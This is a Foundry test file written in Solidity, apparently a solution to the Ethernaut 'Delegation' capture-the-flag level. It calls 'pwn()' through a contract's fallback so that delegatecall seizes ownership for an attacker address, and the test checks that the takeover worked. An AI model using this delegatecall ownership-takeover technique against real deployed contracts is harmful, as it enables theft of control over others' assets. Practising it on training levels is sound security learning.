// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../../src/Delegate/Delegate.sol";

contract DelegateTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address owner = address(1);

    function setUp() public {
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
    }

    function test_claimOwnership() public {
        bytes memory data = abi.encodeWithSignature("pwn()");

        address attacker = address(41);
        vm.prank(attacker);
        (bool success, ) = address(delegation).call(data);

        assertEq(delegation.owner(), address(attacker));
    }
}
